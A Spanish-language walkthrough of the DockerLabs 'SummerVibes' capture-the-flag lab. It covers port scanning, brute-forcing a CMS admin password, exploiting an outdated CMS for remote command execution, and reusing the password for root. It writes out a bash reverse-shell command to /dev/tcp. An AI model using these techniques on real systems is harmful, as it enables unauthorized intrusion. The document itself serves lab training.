---
layout: default
title: SummerVibes
parent: DockerLabs
---
# SummerVibes
{: .no_toc }

## Contenidos
{: .no_toc .text-delta}

1. TOC
{:toc}

---
# Reconocimiento

Iniciaremos tirando nuestro script de reconocimiento para descubir **puertos abiertos**{:.text-red-100}.
![](/assets/img/DockerLabs/SummerVibes/S0.png)

Identificamos 2 puertos abiertos:
- Servicio **SSH** del puerto 22.
- Servicio **HTTP** del puerto 80.

![](/assets/img/DockerLabs/SummerVibes/S1.png)

Si vemos, por defecto tendremos la pagina de bienvenida de un servidor **APACHE**, si vamos a su codigo fuente, veremos algo interesante:
![](/assets/img/DockerLabs/SummerVibes/S2.png)

Una vez entramos, veremos un servicio **CMS**, si bajamos, veremos que nos muestra que existe un panel de acceso. Por lo que nos iremos, y trataremos de probar **credenciales por defecto**{:.text-green-100}.
![](/assets/img/DockerLabs/SummerVibes/S3.png)

Una vez veamos que no existen passwords por defecto, nos queda aplicar **fuerza bruta**{:.text-red-100}, si vemos, obtendremos una password que parece ser la del **admin**.
![](/assets/img/DockerLabs/SummerVibes/S4.png)

# Intrusion
Una vez dentro, podremos ver que se trata de una version desactualizada, la **2.2.19**, si damos una busqueda rapida por la web, encontraremos una vulnerabilidad que nos permite la **ejecucion remota de comandos**{:.text-red-100}.
![](/assets/img/DockerLabs/SummerVibes/S5.png)

Por lo que nos queda intentarlo.
![](/assets/img/DockerLabs/SummerVibes/S6.png)

Como podemos apreciar, tenemos forma de ejecutar comandos, lo que nos queda ahora es entrar al servidor.

```bash
bash -c "bash -i &>/dev/tcp/<IP>/PUERTO 0>&1"
```
![](/assets/img/DockerLabs/SummerVibes/S7.png)

## Root
Una vez dentro, podremos apreciar que existen usuarios como: **root,cms**, probaremos la password que obtuvimos anteriormente, con ambos.
![](/assets/img/DockerLabs/SummerVibes/S9.png)

# FIN
